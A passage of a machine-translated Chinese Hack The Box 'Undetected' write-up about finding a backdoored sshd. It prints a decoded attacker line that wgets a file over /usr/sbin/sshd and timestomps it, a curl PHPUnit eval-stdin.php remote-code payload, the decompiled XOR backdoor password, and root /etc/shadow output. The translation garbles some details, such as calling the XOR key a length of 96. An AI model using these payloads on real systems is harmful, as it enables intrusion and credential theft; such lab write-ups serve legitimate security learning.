ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0 ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d<br/><br/>wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `datbase64: invalid input</span></pre><p id="5113" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">好像是在sbin里把一张图片写成sshd守护进程了。为什么会这样？</p><h1 id="1c35" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">可疑的sshd文件</h1><p id="0cb2" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">让我们获取sshd文件，并在Kali上查看它:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="1758" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# curl --data "&lt;?php system('cat /usr/sbin/sshd');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --output sshd</span></pre><p id="4372" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">执行该文件向我们展示了它看起来是一个普通的sshd二进制文件:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="a7c5" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# ./sshd --help<br/>unknown option -- -<br/>OpenSSH_8.2p1, OpenSSL 1.1.1m  14 Dec 2021<br/>usage: sshd [-46DdeiqTt] [-C connection_spec] [-c host_cert_file]<br/>            [-E log_file] [-f config_file] [-g login_grace_time]<br/>            [-h host_key_file] [-o option] [-p port] [-u len]</span></pre><p id="b04a" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">8.2版本于2020年2月14日发布，但我没有发现任何容易尝试和利用的漏洞。</p><h1 id="3e3e" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">又和吉德拉倒车了</h1><p id="b52f" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">将这个二进制文件导入到Ghidra后，我发现了一些有趣的东西:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi oa"><img src="../Images/712e3ea1e7a9ddb1dd273eba2dc2f6c7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9f3IyGrq6wr9Q04S.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">用Ghidra看sshd</figcaption></figure><p id="10a5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">auth_password函数有一个变量叫做backdoor。在这里查看函数<a class="ae mf" href="https://github.com/openssh/openssh-portable/blob/master/auth-passwd.c" rel="noopener ugc nofollow" target="_blank">的官方源代码</a>我们可以看到它被修改了。</p><p id="de97" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我不会详细说明如何计算出添加的后门代码的作用。主要关注的是开始时被赋值的变量:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="0bd4" class="no kg iq nk b gy np nq l nr ns">char backdoor [31];<br/>backdoor[30] = -0x5b;<br/>backdoor._28_2_ = 0xa9f4;<br/>backdoor._24_4_ = 0xbcf0b5e3;<br/>backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;<br/>backdoor._12_4_ = 0xfdb3d6e7;<br/>backdoor._8_4_ = 0xf7bbfdc8;<br/>backdoor._4_4_ = 0xa4b3a3f3;<br/>backdoor._0_4_ = 0xf0e7abd6;<br/>bVar7 = 0xd6;<br/>pbVar4 = (byte *)backdoor;</span></pre><p id="a3ca" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">变量后门是用31个字节创建的。然后小端格式的十六进制值存储在其中。我已经重新安排了顺序，所以它是降序的，还要注意后门[30]是一个无效值-0x5b，如果你在Ghidra中右键单击它，你会看到正确的值是0xa5。</p><p id="16ac" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">接下来是一个遍历pbVar4的循环，它包含所有添加到后门的十六进制值的结果:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="ed03" class="no kg iq nk b gy np nq l nr ns">while( true ) {<br/>    pbVar5 = pbVar4 + 1;<br/>    *pbVar4 = bVar7 ^ 0x96;<br/>    if (pbVar5 == local_39) break;<br/>    bVar7 = *pbVar5;<br/>    pbVar4 = pbVar5;<br/>}<br/><br/>iVar2 = strcmp(password,backdoor);</span></pre><p id="d2a7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在每次循环中，这些值都与长度为96的密钥进行xor运算，然后进行一次sting比较，看您在登录SSH时输入的密码是否与backdoor的值匹配。这很难理解，因为有人故意通过移动变量的值来混淆我们。<a class="ae mf" href="https://en.cppreference.com/w/c/language/operator_precedence" rel="noopener ugc nofollow" target="_blank">这个</a>对于C操作人员来说是一个很好的参考。</p><h1 id="d490" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">解码根密码</h1><p id="88eb" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">要查看后门变量持有的密码是什么，我们需要解码上面的内容。这可以用一个简单的Python循环来完成，但使用CyberChef更容易:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ob"><img src="../Images/0c8be33dfab94a6c907cb7f94defffd3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*4EhyZLnJO51eMtfV.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">使用CyberChef查找根密码</figcaption></figure><p id="952b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">就像在函数中一样，我们将后门程序的内容从Little Endian转换为Hex，然后进行XOR运算。结果是根密码，所以让我们登录并完成框:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="5ba7" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# ssh root@djewelry.htb<br/>root@djewelry.htbs password: <br/>Last login: Tue Feb 22 19:43:08 2022 from 10.10.14.193<br/>root@production:~#<br/>root@production:~# cat /root/root.txt<br/>3a931f64fcdcfb18217aeb6bd37ad8d9<br/><br/>root@production:~# cat /etc/shadow<br/>root:$6$xxydXHZzlPY4U0lU$qJDDFjfkXQnhUcESjCaoCWjMT9gAPnyCLJ8U5l2KSlOO3hPMUVxAOUZwvcm87Vkz0Vyc./cDsb2nNZT0dYIbv.:19031:0:99999:7:::</span></pre><p id="ddb0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">完成了。下次见。</p></div><div class="ab cl oc od hu oe" role="separator"><span class="of bw bk og oh oi"/><span class="of bw bk og oh oi"/><span class="of bw bk og oh"/></div><div class="ij ik il im in"><p id="2982" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="350e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">推特—【https://twitter.com/pencer_io】T4<br/>网站— <a class="ae mf" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="80d9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="oj">原载于2022年7月2日</em><a class="ae mf" href="https://pencer.io/ctf/ctf-htb-undetected/" rel="noopener ugc nofollow" target="_blank"><em class="oj">https://pencer . io</em></a><em class="oj">。</em></p></div></div>    
</body>
</html>